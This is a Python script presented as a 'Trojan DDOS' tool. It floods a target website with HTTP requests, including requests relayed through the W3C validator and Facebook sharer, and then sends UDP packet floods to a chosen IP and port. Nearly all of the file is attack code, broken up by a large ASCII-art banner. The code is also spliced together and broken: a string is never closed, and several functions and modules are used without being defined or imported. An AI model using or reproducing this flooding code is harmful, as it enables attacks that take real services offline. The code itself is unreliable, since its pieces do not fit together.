#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Trojan Dos Script v.1
# by MR.K7C8NG
# only for legal purpose


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mbot Trojan...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--mengirim Trojan--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<-> web site down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe website down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m  	Trojan DDOS

    print \
""""""""""""""""""""""""""""""""""""""""""""""""""""""""
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,.,**((##########/**,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
                                                         ,***,..                                 ..,***.                                                        
                                                 ,**,.       ,***//*.....,,,,*,*,**,*,... ..,*/***,.       .***.                                                
                                           ,/*      .,//. .,*//,. ./  .. ,*..( ,# ,# ,(  .  .%  .*(/*...,//,.     ./*.                                          
                                      ./.     ,(*. .(/.    (.   *  /#, */.*/ (,.(.(*.(,.(, (#*  .  ./*    ,(/. ./(.     ,/.                                     
                                  **.    //,.*/*. ,(,       (/*, *# ./ .#. , ..(*/, ., .* ,( .(. (/**       */ ..*/. ,**    .*,                                 
                              ,/.   ,/*.*(,         */(,( .#/  (, .*           */.           /  /, .(/ ./,((.        ./*../*.   .*.                             
                           *,   .** */.   .#/.  ,,    (,*#,  (                 ( (                */. /(.(*   .#.  ,#/    */. /*    /,                          
                        /.   .( .%,          ,(,( .( ./#, .( .                /. ,.                 */  /#* ,* .(,(.          */ .#.   **                       
                     *,   */../*//.  ,(.        */ ,/(*  *                  ,.(///,..                 .. .((* ./.        //. .,/*,/..(,   *,                    
                  ./   ./ ./.      ./(/*,. ,(/. ./((*  .                    (/** /(/,                   .  ./((* .,/(..,*(*/*       ./../.  .*                  
                .*   ** */           #,*,#,  ,*.//   ..                     ( /* (.,,  .                      .(,.*.. /(.*.,           ** **   *.               
              *,   (. /*(.           ( (     ,.   .,/.                  .(/(/(#(((#(*(*(                   ,*..   ,.    .*.*           */,(.,(   *.             
            ,,   (.*/,/.            .(*/.    *(((*.                      .(//*//.//*(/,                       ,/(((,    ,(**             */,/,./   *.           
          .*   *// **        .*.*/(#/***/,                               *#(((/((((#(##,                               /****/((/,,/         (,.(*/  ./          
         *.  ,(. (      .*(#(*. .(***  *,#***/((#%#.                    .(*#///#/#(/(#/(                     ,%%#(/***(**. ,./,* .,/##/,.     ,( *#,  *.        
       .*  .(  /.                   .(,(                              /#((*(*(.///*(*(/#(#*                             .*,*                    ,* ,/   *       
      ,,  ,* .*                   *//(///(, .                                  ,(.                                 .. *//(///(                    *  (.  /.     
     ,.  *. .*                  .(/ *   / (*,,,,*//.                       ,#*.(,/.((.                       */***,,,(( #  ,,.(*                   /  /,  *.    
    *.  #. .,              (*..  ./(((.(                                 .*(* /(.#,.*/*                                 ,/,((/,.   .(*              /  .*  ,.   
   ,   *.  /               ,/#.,/((((////((/(((*.                        *.(* #. ** ,(*.                       .,/((*((///(/(((/(./(*.              ./  **  *   
   *  *,  (   .,**///******/*,..,* .*   *. #    .*//,                    .*,//*, *,(/.*                     *(/,.   ,, /.   (. * ..**/****,*///*,,.  .,  /,  /  
  /  .*  (/*..                 ./..(.   ,*..(#/.    .,,                    .((/(,((#,                     *..    ,/(/../    ,,.,/                  .,*(*  /   * 
 ,   / ,(//                    .*/#%##.%##(/,   /((*                        (,(, /,,,                      ..(/#,  ./(##(/.(###/,                    ,//(.*(  * 
 *  .#, /.                   ./((*///((////(/* /.    *(.                     */*,/#.                     *(.    ,, //*(//((///*(/(*                    *, /(.  /
.,  (, *.             .,*/, .*(/  ,,     (   (   .*(,   *(  .                 .* /                 .  *(.   *(.   .,  ,,     *   (*, .*/*.              /  (*  /
/   # ./           ./.   #/..#.   *      *,   ,(#*   ,(/   (. .,             ./****            . *  /,  ,/(.  .(#(.   ,.     /    ,* .#*   /*           ./ ./  .
(  ./ /(,             //  .(,     .,*(*(*, .///     */   /(  /,  /            *. ,.           ,(  (  .#   .#.  . .((*..,*/*/,..    .//  ,(.             /(,./   
(  ,/*.*         .**.,/*.   ,(,,****,********,,(       *#, ,(, ,(  ,/*//**./*,/,/*,,*/.//*/*/, .(  // ./(       ,*,,******/***,*,,,/    ,/*.,*,          (.(/   
(  .( (.     ./*,*/         ((, ./,(    ./,(  *//    .(/  //  //    ./ /  (. ./  .*  ,, .(.(.   ,#, ,#, .//     #(, .*,/    ./,*  *(,        ./*,/*.     ,,./   
(  .( /,/(#*(/              *    #        ,,    (   ((.../*  /(.    %/(*(.,/.,(.,,*..(*./,#**     #,  /(  ***  ./    *         *   .*             .(*//#,,../  ,
..  #,*,*.               **      %        .*      /,(  //. ,//       /,/*((/(*(/./(*(/(#/(,#      ,*/  //. .(*,      *        .*      (.               ,(.*.*  *
 *  ,/ *  .,,               (/(/(****,***/*/(/(*(,*.   ,  ,*#      ./* /( ,/,,,,,*,,,*. (* **       /(  ,.   /,(*/(/#*/***,****/(/((*              .*,  *.,(,  (
 *   /.,(,*              **  ,#./,,  ( /   ,,/**./       / *      .*,//. .(/*,,,,,,,*//  ,/*,(.     ,**.      ././*./.   ,.* .*/**#. .(,             .*,/ *(  ,.
 .*  ,(* /. ,#.         ..*#* ./*   .( (   .*(./.       (.# .(./,/#/*(%,#../ ,* . ( .(..**#//*/#(.*/. (./       *,,,/.   *.*   ,,* .%(,.          /(   ( #(   , 
  *.  /* /** /          ,/.,/../*    # /  ./*.(,*/    .*   /. % /, .(  .//   //  .(,  .(*   /  /, / *.  .(    ./,*(,(,  .* *   .** *(.,*.         ,*./*/ (*  ,. 
   *   /.*. (     /*....*#    *,,    ( ( (,,,(,(,     . .*,,  .* *  .*   /   ,,   (   .(   (  *, #.  (.(  ..    //,*,./* * *    (*,   .(,..../,    ., *,*/  ,.  
    (  .(/ .*  . ./(*(.,#.  ,(,*     (./   ./,(**.  *,. *(.     /,/* */  ,,  .*  ./  ./  ./. /,**     *(,../.  /,/(.(    * *     / /.  ,#.///(* ,  ., .(/  .*   
     *   /. /. .(,./. .(.   *(       (.(  /,/   .(/,/. *(/        ,/,#.(/.#/.*#, *#,,(/.(/*#,#.       ./(, */,(*   .(** .*.*       (.  ../  **./*  ,, //  ,*    
      /.  /, *(*             ((      (./**/           /(/ ,//.       .//,*,**********,*,*#,        /*/..#(,          ,(/.*.*     ,(,             .(, /*  .,     
       ,.  ,* /.    ./     .(. *.    ( (/.           *,*,(  (/**      .(.               *(       ///* ,(,(*.          .*(* *    *. **     ./     *..(.  *.      
        .*   /..*   *,*  /,.   /.   */*(,         .*,*#*.             .**...............(. .           .,/(,*,          //*(    /.  . (,..**.  ./ */   /        
          *.  .( //,.( .* ,*       **   *           (,     ,(..,,//((/,.. .             .,*#((/*,.../.     /*          *,   (.      ./  # .( **,.#.  ,.         
           ./   ,(( ,* # .(*/.   .(#(***(,         /(.,(**,        .       .,       /.      .        .,*//,,(.         //**/(#/    *//#  / * ,*(.  .*           
             .*   *#.,*#.*.( .(,////*/***(. .(/   ,#    (*,.     .,*////****,,,*,,,******///**,.     .,//   ,#.   (*  */**/**(.(,*/. / /./(.*#,  .*             
               .*   .#./(.,*/ /#(,         ,(#.*/,#. .,/../((,.  .,*/((((/*,,,......,*//((##/*.   .//(*..#.. /( /.*/(.         *##/*.* ,(**(.  .*               
                  /    /#(../ /,//////////////,.#*,/..(..../*,*/(/*.......................  ..*(/**,/*...,/ ,./*# *///////////(((/,.(.,(#*   ,,                 
                    **   .(/*. ,*    */      /,   *./,/,*( */.****/.          ,***.          ./**** /,***./,//.   *.     .#.    (. *.//.  .*.                   
                       /.   .//   /.* /    ((. ,* *.,*( ,* .     .(*../(//(/.,((((/..(///(* .**      ..(../(.*, /. ,#,    #*.,(  ,#/    **                      
                          /.   ./*  *..(  .*.(,..*       .  /(.###%,     .     ..     ..     /#%##,%,         ., /,,.*  ./ /.  (,    /,                         
                             ,*    ./// .*/, (*..,  .(        ,*#/ ,//. ,/, */     (. */. ,((..#/,.       ,/  ./ **, (/. .((/.   ./.                            
                                .*,     */,**  /. /,/.(    (,    *****,   ,/./ .. .(./.   ****/.    /,    /,**, ,, ./,*(*    .**                                
                                     **.    .*#*.(. ., ,(. /./        (, . ./*,( ((,/... /,       .#*..,/. #  *,./(,     .*,                                    
                                         .**      .,(#(/.   *, ,((,..*.,.  *,  ,/,  /,. / ,,.,*#*. (.   ,((#/,      ./*                                         
                                               ,,*,       .,,*(#/*.  .(..,/,*(//,(*(.**, .*   ,/(((/*..       ,*,.                                              
                                                      .**,,.            ..,.,*,,*,,,,,..            ..,,**.                                                     
                                                                 .,/((*,,....... .......,*/((/,.                 

    """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""


def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    fmt = 'Attacking {ip} on {port} for {time} with a size of {size} bytes.'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports',
        time='{time} seconds'.format(time=time) if str(time).isdigit() else 'unlimited time',
        size=size
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(65500, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('Attack finished.')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Usage: python ud.py <ip> <port> <time> <size>')

    parser.add_argument('ip', type=str, help='IP or domain to attack.')
    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
    parser.add_argument('-s', '--size', type=int, default=1024, help='Size in bytes.')

    args = parser.parse_args()

    try:
        attack(args.ip, args.port, args.time, args.size)
    except KeyboardInterrupt:
        print('Attack stopped.')
